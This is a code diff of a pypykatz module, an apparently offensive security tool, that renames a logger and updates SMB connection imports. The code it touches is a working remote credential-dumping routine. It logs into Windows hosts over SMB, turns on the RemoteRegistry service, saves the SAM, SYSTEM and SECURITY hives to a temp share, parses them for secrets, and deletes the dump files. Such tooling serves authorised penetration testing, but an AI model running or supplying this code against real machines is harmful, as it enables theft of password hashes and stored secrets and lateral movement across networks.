@@ -2,12 +2,12 @@
 import asyncio
 import os
 
-from pypykatz import logging
+from pypykatz import logger
 from aiosmb.examples.smbshareenum import SMBFileEnum, ListTargetGen, FileTargetGen
 
 
 async def regdump(url, hives = ['HKLM\\SAM', 'HKLM\\SYSTEM', 'HKLM\\SECURITY'], remote_base_path = 'C:\\Windows\\Temp\\', remote_share_name = '\\c$\\Windows\\Temp\\', enable_wait = 3, targets = [], worker_cnt = 5):
-	from aiosmb.commons.connection.url import SMBConnectionURL
+	from aiosmb.commons.connection.factory import SMBConnectionFactory
 	
 	base_url = None
 	base_conn = None
@@ -29,11 +29,11 @@ async def regdump(url, hives = ['HKLM\\SAM', 'HKLM\\SYSTEM', 'HKLM\\SECURITY'], 
 			if len(notfile) > 0:
 				tgens.append(ListTargetGen(notfile))
 
-	if isinstance(url, SMBConnectionURL):
+	if isinstance(url, SMBConnectionFactory):
 		base_url = url
 		base_conn = url.get_connection()
 	else:
-		base_url = SMBConnectionURL(url)
+		base_url = SMBConnectionFactory.from_url(url)
 		base_conn = base_url.get_connection()
 	
 	regdump_coro = regdump_single(
@@ -89,25 +89,25 @@ async def regdump_single(targetid, connection, hives = ['HKLM\\SAM', 'HKLM\\SYST
 		po = None
 
 		async with connection:
-			logging.debug('[REGDUMP] Connecting to server...')
+			logger.debug('[REGDUMP] Connecting to server...')
 			_, err = await connection.login()
 			if err is not None:
 				raise err
 			
-			logging.debug('[REGDUMP] Connected to server!')
+			logger.debug('[REGDUMP] Connected to server!')
 			async with SMBMachine(connection) as machine:
-				logging.debug('[REGDUMP] Checking remote registry service status...')
+				logger.debug('[REGDUMP] Checking remote registry service status...')
 				status, err = await machine.check_service_status('RemoteRegistry')
 				if err is not None:
 					raise err
 				
-				logging.debug('[REGDUMP] Remote registry service status: %s' % status.name)
+				logger.debug('[REGDUMP] Remote registry service status: %s' % status.name)
 				if status != SMBServiceStatus.RUNNING:
-					logging.debug('[REGDUMP] Enabling Remote registry service')
+					logger.debug('[REGDUMP] Enabling Remote registry service')
 					_, err = await machine.enable_service('RemoteRegistry')
 					if err is not None:
 						raise err
-					logging.debug('[REGDUMP] Starting Remote registry service')
+					logger.debug('[REGDUMP] Starting Remote registry service')
 					_, err = await machine.start_service('RemoteRegistry')
 					if err is not None:
 						raise err
@@ -116,7 +116,7 @@ async def regdump_single(targetid, connection, hives = ['HKLM\\SAM', 'HKLM\\SYST
 
 				
 				
-				logging.debug('[REGDUMP] Remote registry service should be running now...')
+				logger.debug('[REGDUMP] Remote registry service should be running now...')
 				files = {}
 				for hive in hives:
 					fname = '%s.%s' % (os.urandom(4).hex(), os.urandom(3).hex())
@@ -125,7 +125,7 @@ async def regdump_single(targetid, connection, hives = ['HKLM\\SAM', 'HKLM\\SYST
 					remote_file = SMBFileReader(SMBFile.from_remotepath(connection, remote_sharepath))
 					files[hive.split('\\')[1].upper()] = remote_file
 					
-					logging.info('[REGDUMP] Dumping reghive %s to (remote) %s' % (hive, remote_path))
+					logger.info('[REGDUMP] Dumping reghive %s to (remote) %s' % (hive, remote_path))
 					_, err = await machine.save_registry_hive(hive, remote_path)
 					if err is not None:
 						raise err
@@ -133,13 +133,13 @@ async def regdump_single(targetid, connection, hives = ['HKLM\\SAM', 'HKLM\\SYST
 				#await asyncio.sleep(1)
 				for rfilename in files:
 					rfile = files[rfilename]
-					logging.debug('[REGDUMP] Opening reghive file %s' % rfilename)
+					logger.debug('[REGDUMP] Opening reghive file %s' % rfilename)
 					_, err = await rfile.open(connection)
 					if err is not None:
 						raise err
 				
 				try:
-					logging.debug('[REGDUMP] Parsing hives...')
+					logger.debug('[REGDUMP] Parsing hives...')
 					po = await OffineRegistry.from_async_reader(
 						files['SYSTEM'], 
 						sam_reader = files.get('SAM'), 
@@ -149,22 +149,22 @@ async def regdump_single(targetid, connection, hives = ['HKLM\\SAM', 'HKLM\\SYST
 				except Exception as e:
 					print(e)
 				
-				logging.debug('[REGDUMP] Hives parsed OK!')
+				logger.debug('[REGDUMP] Hives parsed OK!')
 				
-				logging.debug('[REGDUMP] Deleting remote files...')
+				logger.debug('[REGDUMP] Deleting remote files...')
 				err = None
 				for rfilename in files:
 					rfile = files[rfilename]
 					err = await rfile.close()
 					if err is not None:
-						logging.info('[REGDUMP] ERR! Failed to close hive dump file! %s' % rfilename)
+						logger.info('[REGDUMP] ERR! Failed to close hive dump file! %s' % rfilename)
 
 					_, err = await rfile.delete()
 					if err is not None:
-						logging.info('[REGDUMP] ERR! Failed to delete hive dump file! %s' % rfilename)
+						logger.info('[REGDUMP] ERR! Failed to delete hive dump file! %s' % rfilename)
 				
 				if err is None:
-					logging.info('[REGDUMP] Deleting remote files OK!')
+					logger.info('[REGDUMP] Deleting remote files OK!')
 		
 		return targetid, po, None
 	except Exception as e:
@@ -173,12 +173,12 @@ async def regdump_single(targetid, connection, hives = ['HKLM\\SAM', 'HKLM\\SYST
 			
 
 async def regfile(url, system, sam = None, security = None, software = None, smb_basepath = None):
-	from aiosmb.commons.connection.url import SMBConnectionURL
+	from aiosmb.commons.connection.factory import SMBConnectionFactory
 	from aiosmb.commons.interfaces.file import SMBFile
 	from pypykatz.alsadecryptor.asbmfile import SMBFileReader
 	from pypykatz.registry.aoffline_parser import OffineRegistry
 
-	smburl = SMBConnectionURL(url)
+	smburl = SMBConnectionFactory.from_url(url)
 	connection = smburl.get_connection()
 
 	if smb_basepath is None:
@@ -209,39 +209,39 @@ async def regfile(url, system, sam = None, security = None, software = None, smb
 
 	po = None
 	async with connection:
-		logging.debug('[REGFILE] Connecting to server...')
+		logger.debug('[REGFILE] Connecting to server...')
 		_, err = await connection.login()
 		if err is not None:
 			raise err
 		
-		logging.debug('[REGFILE] Connected to server!')
-		logging.debug('[REGFILE] Opening SYSTEM hive dump file...')
+		logger.debug('[REGFILE] Connected to server!')
+		logger.debug('[REGFILE] Opening SYSTEM hive dump file...')
 		# parse files here
 		_, err = await system_smbfile.open(connection)
 		if err is not None:
 			raise err
 
 		if sam_smbfile is not None:
-			logging.debug('[REGFILE] Opening SAM hive dump file...')
+			logger.debug('[REGFILE] Opening SAM hive dump file...')
 			_, err = await sam_smbfile.open(connection)
 			if err is not None:
 				raise err
 				
 		if security_smbfile is not None:
-			logging.debug('[REGFILE] Opening SECURITY hive dump file...')
+			logger.debug('[REGFILE] Opening SECURITY hive dump file...')
 			_, err = await security_smbfile.open(connection)
 			if err is not None:
 				raise err
 				
 		if software_smbfile is not None:
-			logging.debug('[REGFILE] Opening SOFTWARE hive dump file...')
+			logger.debug('[REGFILE] Opening SOFTWARE hive dump file...')
 			_, err = await software_smbfile.open(connection)
 			if err is not None:
 				raise err
 		
-		logging.debug('[REGFILE] All files opened OK!')
-		logging.debug('[REGFILE] Parsing hive files...')
+		logger.debug('[REGFILE] All files opened OK!')
+		logger.debug('[REGFILE] Parsing hive files...')
 		po = await OffineRegistry.from_async_reader(system_smbfile, sam_reader = sam_smbfile, security_reader = security_smbfile, software_reader = software_smbfile)
-		logging.debug('[REGFILE] Hive files parsed OK!')
+		logger.debug('[REGFILE] Hive files parsed OK!')
 
 	return po
